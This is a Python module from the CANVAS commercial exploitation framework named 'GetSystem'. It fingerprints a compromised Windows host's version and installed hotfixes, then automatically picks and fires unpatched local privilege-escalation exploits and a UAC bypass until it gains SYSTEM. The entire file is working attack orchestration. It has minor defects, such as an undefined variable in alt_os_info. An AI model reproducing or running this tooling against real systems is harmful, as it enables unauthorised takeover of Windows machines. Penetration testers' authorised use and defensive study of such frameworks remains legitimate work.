#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import re
import socket
import locale
import random
import base64
import math
import re
import logging
import timeoutsocket
import urllib2

try:
    import xlrd
except Exception, err:
    logging.warning("GetSystem: %s" % err)
    raise ImportError

from datetime import datetime
import ast

from exploitutils import *

from canvasexploit import canvasexploit
from exploitmanager import exploitmanager
from ExploitTypes.localcommand import LocalCommand
import canvasengine
import CANVASNode

NAME                            = "GetSystem - Windows generic automatic LPE"
DESCRIPTION                     = "Auto-find unpatched LPE vulnerabilities and exploit them"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Commandline"]    = "runmodule GetSystem"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION["Notes"]          = """
"""

def get_ps_output(output):
    start_needle = "START_OUTPUT"
    end_needle = "END_OUTPUT"

    if start_needle not in output or end_needle not in output:
        return ""
    else:
        start_idx = output.index(start_needle) + len(start_needle)
        end_idx = output.index(end_needle)

        return output[start_idx:end_idx].lstrip().rstrip()

BUILD_DATES = {}

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.genTime        = str(int(time.time()))
        self.name = "CANVAS Exploit: %s" % NAME
        return

    def set_progr(self, msg, percent):
        self.setInfo(("%s - " % NAME) + msg)
        self.setProgress(percent)

    def extract_os_name(self, line):
        needle = "Microsoft Windows "
        msw_idx = line.find(needle)
        windows_ver = []

        found_server = False
        for i in range(msw_idx + len(needle), len(line)):
            if line[i].isspace():
                if not found_server:
                    if "Server" in "".join(windows_ver):
                        windows_ver.append(line[i])
                        found_server = True
                    else:
                        break
                else:
                    break
            else:
                windows_ver.append(line[i])

        return "Windows " + "".join(windows_ver)

    def extract_build_version(self, line):
        re_result = re.search("(?P<major>\d+)\.(?P<minor>\d+)\.(?P<build>\d+)", line)

        if re_result is None:
            return None
        else:
            rev_re_result = re.search("(?P<major>\d+)\.(?P<minor>\d+)\.(?P<build>\d+)\.(?P<revision>\d+)", line)
            if rev_re_result is not None:
                re_result = rev_re_result

            build_version = re_result.group(0)

            return build_version

    def alt_os_info(self, node):
        output = node.shell.runcommand("cmd /k")

        if output.startswith("Failed"):
            return None
        else:
            result = {}
            result["os_name"] = self.extract_os_name(output)
            result["build_version"] = self.extract_build_version(line)

            return result

    def get_os_date(self, os_info):
        data = None
        versions_path = os.path.join(os.path.dirname(__file__),
                                     "Resources",
                                     "build_versions.txt")

        with open(versions_path, "rb") as handle:
            data = handle.read()

        build_list = ast.literal_eval(data)
        os_name = os_info["os_name"]

        name_candidates = []


        for entry in build_list:
            if os_name in entry[0]:
                name_candidates.append(entry)

        if len(name_candidates) == 0:
            logging.warning("Could not fingerprint OS version!")
            return None

        last_candidate = None
        for entry in sorted(name_candidates, key=lambda x: x[1]):
            last_candidate = entry
            # NN: this condition should probably be controlled by the
            # user later
            if os_info["build_version"] == entry[1]:
                last_candidate = entry
                break
            elif os_info["build_version"] > entry[1]:
                last_candidate = entry
                continue
            elif os_info["build_version"] < entry[1]:
                break

        os_date_string = last_candidate[2]
        if "." in os_date_string:
            os_date_string = os_date_string.replace(".", "/")

        return datetime.strptime(os_date_string, "%m/%d/%Y")

    def old_build_exploit_list(self, os_info):
        # This should probably be fleshed out more... In this
        winxp_exploit_names = ["ms11_080"]
        win2k_exploit_names = [""]

        exploit_names = []

        return ["ms_ntvdm"]

    def getListener(self, app):
        """
        Returns -1 on failure (extremely rare).
        Returns none if no listener is needed
        returns a listener otherwise
        """
        neededtypes=app.neededListenerTypes()
        if neededtypes!=[]:
            listener= self.engine.autoListener(None, neededtypes[0])
            if listener==None: #still none? Then print error message
                logging.warning("You need to select a valid listener %s for this exploit! (Is it blue?)"%(app.neededListenerTypes()))
                return -1
            listener.argsDict=app.listenerArgsDict

        else:
            listener=None
        app.callback=listener
        return listener

    def setExploit(self, app, app_class):
        app.argsDict = self.argsDict
        app.argsDict["passednodes"] = self.argsDict["passednodes"]
        app.target = self.target
        app.setId(self.engine.getNewListenerId())
        app.engine = self.engine
        app.setLogFunction(self.engine.exploitlog)
        app.setDebugFunction(self.engine.exploitdebuglog)
        app.setInfo(app.getInfo())
        app.setCovertness(self.engine.getCovertness())
        self.manager=exploitmanager(app, self.engine)
        return self.manager

    def runExploit(self, app):
        """
        run the exploit , including set up the listeners it needs for callbacks
        """
        ret = self.manager.run()
        #self.exploits.append(app)

        ##Did we succeed in exploiting the box ?
        try:
            if isinstance(ret, CANVASNode.CANVASNode) or app.ISucceeded():
                logging.info("Exploit succeeded!")
                return ret
        except timeoutsocket.Timeout as e:
            return 0xD1EDD1ED
        return ret


    def run_exploits(self, node, exploit_list):
        # NN: allow the user to either print out the LPEs, save them in Knowledge for later manual use
        exploit_executed = []
        for exploit in exploit_list:
            if exploit.NAME in exploit_executed:
                continue
            else:
                exploit_executed.append(exploit.NAME)
            logging.info("Running LPE: \"%s\"" % exploit.NAME)
            lpe = exploit.theexploit()
            lpe.link(self)
            lpe.argsDict["passednodes"] = [node]

            manager = self.setExploit(lpe, exploit)
            listener = self.getListener(lpe)

            if hasattr(lpe, "is_vulnerable"):
                if not lpe.is_vulnerable():
                    logging.info("Exploit (%s) claims node %s is not vulnerable, skipping" % (exploit.NAME, str(node)))
                    continue

            # lpe_ret = lpe.run()
            lpe_ret = self.runExploit(lpe)

            logging.info("\"%s\" returned: %s" % (exploit.NAME, str(lpe_ret)))
            if lpe_ret == 0xD1EDD1ED:
                logging.critical("Possibly node is died")
                break
            elif not lpe_ret:
                continue
            else:
                return 1                

        return 0

    def exploit_list_win10(self):
        exploit_modules = canvasengine.exploitmodsGet()
        return [
                exploit_modules['smbghost_lpe'],
                exploit_modules['alpc_takeover_lpe'],
                exploit_modules['alpc_appxedge_lpe'],
                exploit_modules['error_reporting_lpe'],
                exploit_modules['sdclt_uac_bypass'],
                exploit_modules['unmarshal_to_system'],
                exploit_modules['ms16_032'],
                exploit_modules['setwindowfnid_lpe'],
                exploit_modules['special_lnk'],
                exploit_modules['dde_closehandle_lpe'],
                exploit_modules['ms16_111'],
                exploit_modules['tpminit_wbemcomn'],
                exploit_modules['ms16_135'],
                exploit_modules['menu_confusion_lpe']
               ]

    def exploit_list_win8(self):
        exploit_modules = canvasengine.exploitmodsGet()
        return [
                exploit_modules['menu_confusion_lpe'],
                exploit_modules['tpminit_wbemcomn'],
                exploit_modules['ms16_111'],
                exploit_modules['ms16_032'],
                exploit_modules['ms15_102'],
                exploit_modules['unmarshal_to_system'],
                exploit_modules['atmfd_pool_buffer_underflow'],
                exploit_modules['ms14_040'],
                exploit_modules['ms15_051'],
                exploit_modules['menu_confusion_lpe']
               ]

    def build_exploit_list(self, os_info, exploit_map):
        os_date = os_info["date"]

        if os_date == None:
            return []

        blacklist_names = self.get_blacklist(os_info)

        exploit_list = []

        for kb in os_info["hotfixes"]:
            if kb in exploit_map:
                bad_module = exploit_map[kb]
                bads_kb = [val for val in exploit_map if exploit_map[val].NAME == bad_module.NAME]
                for bad_kb in bads_kb:
                    exploit_map.pop(bad_kb, None)
                    logging.info("Ignoring exploits patched in %s - the hotfix has been applied" % kb)

        for kb in exploit_map:
            candidate = exploit_map[kb]
            logging.info(candidate)
            blacklisted = False
            for exploit in blacklist_names:
                if exploit.NAME == candidate.NAME:
                    logging.info("Skipping exploit (%s) - it is blacklisted for the target OS" % candidate.NAME)
                    blacklisted = True

            if not blacklisted:
                logging.info("Found candidate exploit: " + candidate.NAME)
                exploit_list.append(candidate)

        return exploit_list


    def get_os_info(self, node):
        # if this command fails then we have a Windows 2k or NT system
        system_info = node.shell.runcommand("systeminfo")

        version_dict = None

        if system_info.startswith("Failed"):
            version_dict = self.alt_os_info(node)

            return version_dict

        state = 0

        result = {}
        hotfixes = []

        file_re = re.compile("File \w+")
        q_re = re.compile("Q\w+")
        kb_re = re.compile("KB\w+")

        for line in system_info.split("\r\n"):
            if state == 0:
                if "OS Name" in line:
                    result["os_name"] = self.extract_os_name(line)
                    state = 1
            elif state == 1:
                logging.info("line: " + line)
                if "OS Version" in line:
                    result["build_version"] = self.extract_build_version(line)
                    state = 2
            elif state == 2:
                if "Hotfix(s)" in line:
                    state = 3
            elif state == 3:
                if ("[" in line) and ("]:" in line):
                    # Windows 2000-XP updates have some of this
                    if "File" in line:
                        match = file_re.search(line)
                        if match is not None:
                            hotfixes.append(match.group(0))
                    # Windows 2000-XP thing again
                    elif "Q" in line:
                        match = q_re.search(line)
                        if match is not None:
                            hotfixes.append(match.group(0))
                    # ... The modern way of naming patches
                    elif "KB" in line:
                        match = kb_re.search(line)
                        if match is not None:
                            hotfixes.append(match.group(0))
                else:
                    break


        if result is not None:
            result["hotfixes"] = hotfixes

        result["date"] = self.get_os_date(result)

        return result

    def get_blacklist(self, os_info):
        blacklist_map = {"Windows Server 2008": ["MS11-032",
                                                 "MS11-054",
                                                 # "win32k.sys bServerSideWindowProc",
                                                 "atmfd",
                                                 "MS10-048",
                                                 "MS16-135",
                                                 "ms14_025",
                                                 "MS12-042", # this doesn't crash but it generates a /ton/ of output
        ],
                         "Windows 10": ["alpc_tasksched_lpe"],
                         "Windows Server 2012": ["MS16-111"],
                         "Windows 8.1": ["MS16-111"],
                         "Windows Server 2016": ["MS16-135"],
                         "all": ["ms_ntvdm", "event_viewer_mscfile"],

        }
        blacklist_names = blacklist_map.get(os_info["os_name"],[]) + blacklist_map.get("all", [])
        exploit_modules = canvasengine.exploitmodsGet()
        blacklist_modules = []
        for exploit_name in blacklist_names:
            blacklist_modules.append(exploit_modules[exploit_name])

        return blacklist_modules


    def get_windows_local_map(self):
        canvasengine.registerAllModules()

        exploit_modules = canvasengine.exploitmodsGet()

        patch_map = {}

        for (module_name, exploit_module) in exploit_modules.iteritems():
            if hasattr(exploit_module, "PROPERTY"):
                if all(["local" in exploit_module.PROPERTY["SITE"].lower(),
                        "exploit" in exploit_module.PROPERTY["TYPE"].lower()]):

                    if "MS PATCHES" in exploit_module.PROPERTY:
                        for patch in exploit_module.PROPERTY["MS PATCHES"]:
                            patch_map[patch] = exploit_module

        return patch_map

    def lpe_special_privs(self, node):
        exploit_list = []
        exploit_modules = canvasengine.exploitmodsGet()

        get_token_privs = self.engine.getModuleExploit("get_token_info")
        get_token_privs.link(self)

        get_token_privs.argsDict["passednodes"] = [node]
        info_success = get_token_privs.run()
        if not info_success:
            logging.warning("Failed to obtain token privileges")
            return []

        token_info = get_token_privs.privileges[node]

        for (token_type, privileges) in token_info.iteritems():
            if token_type == "process":
                if privileges and privileges.get("SeImpersonatePrivilege"):
                    logging.info("Process has SeImpersonatePrivilege")
                    logging.info("Prioritizing configuration abusing seimpersonatepriv_lpe")

                    # lpe = self.engine.getModuleExploit("seimpersonatepriv_lpe")
                    lpe = exploit_modules["seimpersonatepriv_lpe"]
                    exploit_list.append(lpe)

        return exploit_list

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        ret = 0

        percent = 0
        increase = int(math.ceil(100 / len(self.argsDict["passednodes"])))

        exploit_map = self.get_windows_local_map() # parse all exploits with 'MS PATCHES' property

        for node in self.argsDict["passednodes"]:
            logging.info("Processing node %s" % (str(node)))

            ntype = node.nodetype.lower()
            if ntype in ["win32node", "win64node"]:
                exploit_list = []

                # Prioritize exploits that abuse fundamental
                # configuration flaws first
                #exploit_list.extend(self.lpe_special_privs(node)) skip it until fix the bug

                os_info = self.get_os_info(node)
                if os_info['build_version'].startswith(u'10.'):
                    exploit_list.extend(self.exploit_list_win10())
                elif os_info['build_version'].startswith(u'6.2') or \
                        os_info['build_version'].startswith(u'6.3'):
                    exploit_list.extend(self.exploit_list_win8())
                else:
                    exploit_list.extend(self.build_exploit_list(os_info, exploit_map))

                if len(exploit_list) == 0:
                    logging.warning("No suitable exploits found, skipping")
                    ret = 0
                else:
                    ret = self.run_exploits(node, exploit_list)
            elif ntype == "powershellnode":
                logging.error("GetSystem can only run on Win32/64Nodes, run converttomosdef to convert a PowerShellNode to the correct type")
                ret = 0
            else:
                logging.error("GetSystem can only run on Win32/64Nodes")
                ret = 0

            percent += increase
            self.set_progr("processed node %s" % (str(node)), percent)

        if ret:
            self.setProgress(100)
            self.setInfo("{} in done (success)".format(NAME))
            return True
        else:
            self.setInfo("{} in done (failed)".format(NAME))
            self.setProgress(-1)
            return False
